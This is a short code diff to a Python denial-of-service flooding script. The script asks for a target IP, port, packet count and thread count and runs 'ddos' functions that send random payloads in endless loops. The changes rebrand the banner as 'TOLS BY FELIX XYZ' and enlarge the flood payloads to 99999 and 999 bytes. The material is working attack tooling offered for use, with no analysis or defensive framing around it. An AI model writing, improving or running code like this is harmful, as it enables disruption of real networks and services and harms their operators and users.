@@ -4,7 +4,7 @@ import threading
 import os,sys
 
 os.system("clear")
-print("UBAH INI")
+print("TOLS BY FELIX XYZ")
 ip = str(input(" Ip:"))
 port = int(input(" Port:"))
 choice = str(input(" (y/n):"))
@@ -12,7 +12,7 @@ times = int(input(" Packets:"))
 threads = int(input(" Threads:"))
 os.system("clear")
 def ddos():
-	data = random._urandom(6318)
+	data = random._urandom(99999)
 	i = random.choice(("[•]","[•]","[•]"))
 	while True:
 		try:
@@ -25,7 +25,7 @@ def ddos():
 			print("[!] Down!!!")
 
 def ddos2():
-	data = random._urandom(180)
+	data = random._urandom(999)
 	i = random.choice(("[•]","[•]","[•]"))
 	while True:
 		try:
